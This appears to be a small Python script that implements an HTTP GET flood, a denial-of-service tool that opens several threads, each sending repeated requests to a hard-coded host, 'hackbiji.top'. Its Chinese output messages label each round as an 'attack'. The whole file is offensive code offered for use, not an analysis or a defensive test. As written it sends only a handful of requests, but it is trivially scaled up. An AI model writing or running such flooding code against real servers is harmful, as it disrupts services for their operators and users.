import http.client
import time
import threading

class Dos(object):
    def __init__(self):
        pass

    def DDoS(self,funcs,sleepTimes,servAddrs,urls):
        threads = []
        loops = range(len(funcs))
        for i in loops:
            t = threading.Thread(target=funcs[i],args=(sleepTimes[i],servAddrs[i],urls[i]))
            threads.append(t)
        for i in loops:
            threads[i].start()

    def httpGetFlood(self,sleepTime,servAddr,url):
        for i in range(3):
            print('第',i+1,'次攻击')
            time.sleep(sleepTime)
            try:
                conn = http.client.HTTPConnection(servAddr)
                conn.request('GET',url)
                r1 = conn.getresponse()
                print(r1.status,r1.reason)
                conn.close()
            except IOError as e:
                print("except:",e)
            finally:
                pass
        print("httpGetDoS END")

if __name__ == '__main__':
    servAddr = "hackbiji.top"
    url = "/"
    sleepTime = 0.01
    hack = Dos()
    funcs = [hack.httpGetFlood, hack.httpGetFlood, hack.httpGetFlood, hack.httpGetFlood, hack.httpGetFlood]
    sleepTimes = [sleepTime,sleepTime,sleepTime,sleepTime,sleepTime]
    servAddrs = [servAddr,servAddr,servAddr,servAddr,servAddr]
    urls = [url,url,url,url,url]

    hack.DDoS(funcs,sleepTimes,servAddrs,urls)